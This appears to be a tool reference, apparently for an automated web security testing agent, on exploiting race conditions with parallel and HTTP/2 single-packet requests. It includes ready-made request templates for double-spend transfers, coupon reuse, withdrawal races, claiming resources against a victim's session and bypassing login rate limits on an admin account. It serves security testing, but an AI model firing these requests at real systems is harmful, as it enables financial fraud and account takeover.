@@ -1,0 +1,154 @@
+=== Race Condition Testing ===
+
+Race conditions occur when application behavior depends on timing of uncontrollable events.
+Web apps: TOCTOU vulnerabilities where check-vs-act window can be exploited.
+
+Priority: HIGH -- subtle, missed by scanners, critical impact.
+
+--- TOOLS (simplest to most precise) ---
+
+  send_parallel(request, targetHost, targetPort?, useHttps?, count?)
+    Send N identical HTTP/1.1 requests simultaneously.
+    Default: count=10, targetPort=443, useHttps=true
+    Good for: TOCTOU, double-spend, coupon reuse
+
+  send_parallel_different(requests, targetHost, targetPort?, useHttps?)
+    Send different requests simultaneously.
+    Good for: buy-vs-refund, concurrent state changes
+
+  send_parallel_h2(requests, targetHost, targetPort?)
+    HTTP/2 single-packet attack. All requests in one TCP packet.
+    Tighter race window than HTTP/1.1. Always uses HTTPS.
+
+  last_byte_sync_raw(targetHost, targetPort, useTls?, requestBase64, count?)
+    Opens N raw TCP/TLS connections, sends all-but-last byte,
+    releases final bytes simultaneously. Sub-millisecond precision.
+    count: 2-50 connections
+
+--- THE TOCTOU PATTERN ---
+
+  Time ->
+
+  Thread 1:  [CHECK balance >= $100] -------- [DEDUCT $100]
+                     |                              |
+                     |    <- RACE WINDOW ->          |
+                     |                              |
+  Thread 2:          [CHECK balance >= $100] -------- [DEDUCT $100]
+
+  Result: Both checks pass, $200 deducted from $100 balance
+
+--- COMMON VULNERABLE OPERATIONS ---
+
+  Operation                  Race Risk
+  ---------                  ---------
+  Balance/credit operations  Double spending
+  Coupon/discount redemption Multiple uses
+  Password reset tokens      Token reuse
+  Rate limiting              Bypass limits
+  Inventory management       Overselling
+  Voting/rating systems      Vote manipulation
+
+--- SINGLE-ENDPOINT RACE CONDITIONS ---
+
+  Send same request multiple times simultaneously:
+
+  send_parallel(
+    request="POST /redeem-code HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\nCookie: session=TOKEN\n\ncode=ONEUSE123",
+    targetHost="target.com",
+    count=20
+  )
+
+  -> If more than 1 succeeds = race condition confirmed.
+
+  Double-spend example:
+    request="POST /transfer HTTP/1.1\nHost: target.com\n...\n\namount=100&recipient=accomplice"
+    send_parallel(request=REQ, targetHost="target.com", count=10)
+    -> If 2+ transfers succeed from $100 balance = vulnerable
+
+--- HTTP/2 SINGLE-PACKET ATTACK ---
+
+  HTTP/2 multiplexing sends all requests in one TCP packet:
+
+  HTTP/1.1: Packet 1->[Req 1]  Packet 2->[Req 2]  (network jitter)
+  HTTP/2:   Single Packet->[Req 1][Req 2][Req 3]  (processed together)
+
+  send_parallel_h2(
+    requests=[
+      "POST /api/withdraw HTTP/1.1\nHost: target.com\n...\n\n{\"amount\":100}",
+      "POST /api/withdraw HTTP/1.1\nHost: target.com\n...\n\n{\"amount\":100}"
+    ],
+    targetHost="target.com"
+  )
+
+  For maximum precision: last_byte_sync_raw with base64-encoded request.
+
+--- MULTI-ENDPOINT RACE CONDITIONS ---
+
+  Racing different operations on shared state:
+
+  Read-while-write:
+    send_parallel_different(
+      requests=[
+        "GET /api/balance HTTP/1.1\nHost: target.com\n...",
+        "POST /api/withdraw HTTP/1.1\nHost: target.com\n...\n\namount=100"
+      ],
+      targetHost="target.com"
+    )
+    -> Does balance show pre-withdrawal amount?
+
+  Competing writes:
+    send_parallel_different(
+      requests=[
+        "POST /claim HTTP/1.1\n...Cookie: attacker_session\n\nresource_id=123",
+        "POST /claim HTTP/1.1\n...Cookie: victim_session\n\nresource_id=123"
+      ],
+      targetHost="target.com"
+    )
+
+  Email update race:
+    Race: POST /forgot-password vs POST /change-email
+    -> Password reset may go to new email
+
+--- PARTIAL CONSTRUCTION RACES ---
+
+  Access objects during incomplete initialization:
+    Race: POST /register (slow) vs GET /users/newuser/profile (fast)
+    -> Access profile before security settings applied
+
+--- RATE LIMIT BYPASS VIA RACE ---
+
+  If rate limit = 5 attempts/minute, send 20 simultaneous requests:
+
+  send_parallel_different(
+    requests=[
+      "POST /login HTTP/1.1\n...\n\nusername=admin&password=pass1",
+      "POST /login HTTP/1.1\n...\n\nusername=admin&password=pass2",
+      ...
+    ],
+    targetHost="target.com"
+  )
+
+  -> If all execute before counter increments = rate limit bypassed.
+
+--- INTERPRETING RESULTS ---
+
+  Pattern 1: All succeed -> race condition confirmed
+  Pattern 2: Mixed results -> some succeeded in race window
+  Pattern 3: First-only success -> no race condition (proper locking)
+  Pattern 4: Same server timestamp -> requests hit same window
+
+  Different content lengths across responses = potential race condition.
+  Timing spread shows synchronization quality.
+
+--- TESTING CHECKLIST ---
+
+  [ ] Identify single-use operations (codes, tokens, transfers)
+  [ ] Test HTTP/2 single-packet for critical operations
+  [ ] Test limit bypass via parallel requests
+  [ ] Check multi-endpoint races on shared state
+  [ ] Test partial construction access
+  [ ] Measure success rates with varying counts (5, 10, 20, 50)
+  [ ] Document timing and response patterns
+  [ ] Verify with state inspection (balance, inventory)
+  [ ] Test with both send_parallel and send_parallel_h2
+  [ ] Use last_byte_sync_raw for maximum precision
